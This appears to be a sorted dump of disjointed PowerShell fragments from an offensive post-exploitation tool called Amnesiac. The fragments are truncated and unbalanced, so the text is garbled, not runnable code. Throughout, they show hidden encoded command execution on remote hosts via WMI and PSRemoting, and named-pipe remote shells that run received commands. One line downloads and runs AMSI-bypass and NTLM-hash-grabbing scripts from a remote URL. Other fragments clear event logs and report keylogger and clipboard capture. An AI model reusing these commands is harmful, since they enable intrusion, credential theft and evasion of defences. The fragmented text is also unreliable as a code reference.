"{ ""$($_.ToString(""X2""))"" "
"{ ""LDAP://$Server/DC=$($Domain -replace '\.',',DC=')"" "
"{ ""LDAP://DC=$($Domain -replace '\.',',DC=')"" "
"{ $_ -match ""No Access"" "
"{ $_ -match ""The current user has"" "
"{ $_ -match ""^\[!\] Process running with"" -or $_ -match ""^\[\+] Sucessfully injected the shellcode into"" -or $_ -match ""is not running"""
"{ $_ -match ""has Local Admin access on"" "
"{ $_ -ne """" "
"{ $_ -ne ""0.0.0.0"" -and $_ -ne ""127.0.0.1"" "
"{ $_ -notmatch ""The current user has"""
"{ $_ -notmatch ""has Local Admin access on"" -AND $_ -notmatch ""Command execution completed"""
"{ $_.ComputerName.ToString(),$_.UserID.ToString(),$_.PipeName.ToString() "
"{ $_.ComputerName.ToString(),$_.UserID.ToString(),$_.UniquePipeID.ToString() "
"{ $_.DisplayName -like ""*$desiredIndex*"" "
"{ $_.DisplayName -like ""*antivirus*"" "
"{ $_.ManifestModule.Name -ieq ""System.Management.Automation.dll"" "
"{ $_.Name -like ""*antivirus*"" "
"{ $command.Substring($i, [Math]::Min($size, $command.Length - $i)) "
"{ ($_ -split ""\s+"")[3] -split "":"" | Select-Object -First 1 "
"{ [int]([regex]::Match($_.DisplayName, '(?<=\[)\d+(?=\])').Value) "
"{ try { ""$_ - "" + [System.Net.Dns]::GetHostEntry($_).HostName "
"{$LineComputerAccess = $ComputerAccess;$LineComputerAccess = $LineComputerAccess -Join "","";Write-Output $LineComputerAccess"
"{$Path = ""c:\Users\Public\Documents\Amnesiac\Scripts"""
"{$ServerScript=""`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `""$SID`"";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`""FullControl`"",`""Allow`"");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()"
"{$ServerScript=""`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `""S-1-1-0`"";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`""FullControl`"",`""Allow`"");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()"
"{$_ -ne ""$HostFQDN"""
"{$_ -ne ""$TempHostname"""
"{$_.State -eq ""Running"""
"{$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace ""root\cimv2"" -Credential $cred"
"{$classExists = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -List -Namespace ""root\cimv2"""
"{$finalstring = ""powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript"""
"{$finalstring = ""powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"""
"{$global:Message = "" [+] Admin Access: $($TempAdminAccessTargets.count) Targets [PSRemoting]"""
"{$global:Message = "" [+] Admin Access: $($TempAdminAccessTargets.count) Targets [SMB]"""
"{$global:Message = "" [+] Welcome to Amnesiac. Type 'help' to list/hide available commands"""
"{$global:Message = "" [-] Invalid command. Type 'help' to list/hide available commands"";continue"
"{$global:Message = "" [-] No Admin Access [PSRemoting]"""
"{$global:Message = "" [-] No Admin Access [SMB]"""
"{$global:Message = "" [-] No Admin Access [SMB]"";continue"
"{$global:Message = "" [-] No Admin Access [WMI]"";continue"
"{$global:Message = "" [-] No Bookmarks set."""
"{$global:Message = "" [-] No Sessions established."""
"{$global:Message = "" [-] No Targets Defined"""
"{$global:Message = "" [-] No User-Defined Targets. Scope: All"";$ShowUserDefinedTargets = $False"
"{$global:MultiPipeName = ""$GlobalPipeName"""
"{$global:ServerURL = ""https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"""
"{$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList (""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" + $finalCommandBase64)"
"{$startProcess = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -Credential $cred -ArgumentList (""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "" + $finalCommandBase64)"
"{$userdefPath = ""c:\Users\Public\Documents\Amnesiac\Scripts"""
"{$wmiDataOutput = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -Credential $cred -Filter ""$KeyID = '$GuidOutput'"""
"{$wmiDataOutput = Get-WmiObject -Class $ClassID -ComputerName $ComputerName -Filter ""$KeyID = '$GuidOutput'"""
"{([wmiclass]""\\$ComputerName\ROOT\CIMV2:$ClassID"").Delete()"
"{1,3"
"{Write-Output """""
"{Write-Output """";Write-Output ""[+] Processes sorted by PID:"";Get-Process | Select ID, ProcessName, SessionId, Path | Sort ID | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output ""[+] Current Process [x64]:"""
"{Write-Output """";Write-Output ""[+] Processes sorted by ProcessName:"";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort ProcessName | ft -Autosize | Out-String -Width 4096;Write-Output ""[+] Processes sorted by Username:"";Get-Process -IncludeUserName | Select ID, ProcessName, SessionId, UserName, Path | Sort UserName,ProcessName | ft -Autosize | Out-String -Width 4096;if($Isx64){Write-Output ""[+] Current Process [x64]:"""
"{Write-Output ""[+] Current Process [x86]:"""
"{Write-Output ""[-] Access Denied""; Write-Output """"; break"
"{Write-Output ""[-] Empty Clipboard"";Write-Output """""
"{Write-Output ""[-] Empty Keylog"";Write-Output """""
"{Write-Output ""[-] Empty RDP Keylog"";Write-Output """""
"{Write-Output ""[-] Error retrieving History for user $userDir"""
"{Write-Output ""[-] Error retrieving screenshot"""
"{Write-Output ""[-] No Access"""
"{`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring"
"{`$_.Exception.Message-split """"`u{000D"
"{`$c=`$r.ReadLine();if(`$c-eq """"exit""""){break"
"{`$e=`$_.Exception.Message;`$e-split`""`r?`n`""|%{`$sw.WriteLine(`$_)"
"{`$err=`$_.Exception.Message;`$err-split""""`u{000D"
"{`$result=iex """"`$c 2>&1 | Out-String"""";`$result-split """"`u{000A"
"{`$result=iex """"`$c 2>&1 | Out-String"""";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())"
"{try{`$r=iex `""`$c 2>&1|Out-String`"";`$r-split`""`n`""|%{`$sw.WriteLine(`$_.TrimEnd())"
"{try{`$res=iex """"`$cmd 2>&1 | Out-String"""";`$res -split """"`u{000A"
"{wevtutil cl ""$_"""
{ 
{ $_ 
{ $_ -and $_.trim() 
{ $_ -ne '' -and $_ -ne $null 
{ $_ -notin $AllDomains 
{ $_ -notin $OutboundTrusts 
{ $_ -replace '^\s*\n' -replace '\n\s*$' 
{ $_.Handle.AsyncWaitHandle.WaitOne() 
{ $_.Id -eq $PID 
{ $_.Identifier -eq $identifier 
{ $_.PipeName -eq $bookmarkIdentifier 
{ $_.Trim() 
{ $_.UniquePipeID -eq $bookmarkIdentifier 
{ $results.Dispose() 
{ 'Bidirectional' 
{ 'Disabled' 
{ 'Inbound' 
{ 'MIT' 
{ 'Outbound' 
{ 'WINDOWS_ACTIVE_DIRECTORY' 
{ 'WINDOWS_NON_ACTIVE_DIRECTORY' 
{ -bnot ($_ -band 0xFF) -band 0xFF 
{ Invoke-Expression $Using:Command 
{ `$_.Id -eq $parentProcessId 
{ `$_.Id -eq `$primaryScriptProcessId 
{ `$_.contains('.') 
{ get; private set; 
{ return $null 
{$ComputerAccess | ForEach-Object { Write-Output $_ 
{$Computers = $global:AllUserDefinedTargets
{$DefineHostname = $global:IP
{$DefineHostname = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
{$ExitLoop = $True;break
{$FinalTargets = $global:AllOurTargets
{$FinalTargets = $global:AllUserDefinedTargets
{$FindCurrentDomain = $env:USERDNSDOMAIN
{$FindCurrentDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() 
{$FindCurrentDomain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()
{$PipeName = $SinglePipeName
{$PlaceHolder = $False;$Host.UI.RawUI.FlushInputBuffer()
{$Port = 135
{$Port = 445
{$Port = 8080
{$PortScan = 135
{$PortScan = 445
{$PortScan = 5985
{$PromptComputerName = $computerNameOnly
{$PromptComputerName = $computerNameOnly -split '\.' | Select-Object -First 1
{$ReachableDomains = $ReachableDomains | Where-Object { $_ -ne $AllDomain 
{$SID = 'S-1-1-0'
{$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
{$ScanMode = $False;$global:ScanModer = $False
{$ShowBookmarks = $False
{$ShowBookmarks = $True
{$ShowMenuCommands = $False
{$ShowMenuCommands = $True
{$ShowSessions = $False
{$ShowSessions = $True
{$ShowUserDefinedTargets = $False
{$ShowUserDefinedTargets = $True
{$TempAccessVar = CheckReachableHosts
{$TempAccessVar = CheckReachableHosts -Domain $Domain -DomainController $DomainController
{$UserDefinedTargets = CheckReachableHosts
{$UserDefinedTargets = CheckReachableHosts -Domain $Domain -DomainController $DomainController
{$_ -ne $HostFQDN
{$_.Pipe.Dispose()
{$allReachTargets = CheckReachableHosts -Domain $Domain -DomainController $DomainController -WMI
{$allReachTargets = CheckReachableHosts -WMI
{$allTargets = CheckAdminAccess
{$allTargets = CheckAdminAccess -Domain $Domain -DomainController $DomainController
{$choice = 3
{$choice = [int]$choice
{$cimSession = New-CimSession -ComputerName $ComputerName
{$computerNameOnly = $ComputerName
{$computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1
{$finalstring
{$global:AllUserDefinedTargets = $global:OldTargetsToRestore;$global:RestoreAllUserDefinedTargets = $False
{$global:Detach = $False
{$global:Detach = $True
{$global:IP = $IP
{$global:MultiPipeName = $global:OldPipeNameToRestore;$global:RestoreOldMultiPipeName = $False
{$global:MultiPipeName = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_
{$global:RestoreTimeout = $False
{$subfolderPath = Join-Path -Path $basePath -ChildPath $_;if (-not (Test-Path $subfolderPath)) {New-Item -Path $subfolderPath -ItemType Directory > $null
{$timeoutSeconds = 30
{$userdefPath = $userdefPath.TrimEnd('\')
{$userdefPort = 8080
{$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName
{$wmiData = Set-WmiInstance -Class $ClassID -ComputerName $ComputerName -Credential $cred
{(FindDomainTrusts -Domain $AllDomain).TargetName
{0
{000A
{3
{Choose-And-Interact -Target $selectedTarget -TimeOut $Timeout
{Detached-Interaction -Target $selectedTarget -TimeOut $Timeout
{FindDomainTrusts -Domain $AllDomain | Where-Object { $_.TrustDirection -eq 'Outbound' 
{Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue
{Get-WmiObject -Class Win32_OperatingSystem -ComputerName $Computer -ErrorAction SilentlyContinue -Credential $cred
{Invoke-Command -ScriptBlock { hostname 
{New-Item -Path $basePath -ItemType Directory > $null
{OutputData = `$outputData; CommandStatus='Completed'
{Remove-CimInstance -CimInstance $cimInstance
{Scan-WaitingTargets
{Scan-WaitingTargets -Domain $Domain -DomainController $DomainController
{Start-Sleep -Milliseconds 100;if(-not `$ps.IsConnected){break
{Start-Sleep 4
{Write-Output '[-] HashGrab Failure'
{Write-Output '[-] No Access'
{Write-Output '[-] Please move to a writable directory'
{[char]$_
{`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring
{`$HashGrab
{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)
{`$c=`$r.ReadLine();if(`$c-eq 'exit'){break
{`$sw.WriteLine(`$_)
{`$sw.WriteLine(`$_.TrimEnd())
{`$w.WriteLine(`$_)
{`$w.WriteLine(`$_.TrimEnd())
{break
{continue
{del 'tmpfile';iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-GrabTheHash.ps1');`$HashGrab = Invoke-GrabTheHash | Where-Object{`$_ -match 'NTLM hash'
{if(-not `$pS.IsConnected){break
{if(-not `$ps.IsConnected){break
{ls \\$Computer\c$ -ErrorAction SilentlyContinue
{param(`$state);`$state.Close()
{return
{type c:\Users\Public\Documents\$ConstructFileName | Out-String -Width 4096
{type c:\Users\Public\Documents\RDP_log.txt | Out-String -Width 4096
{whoami
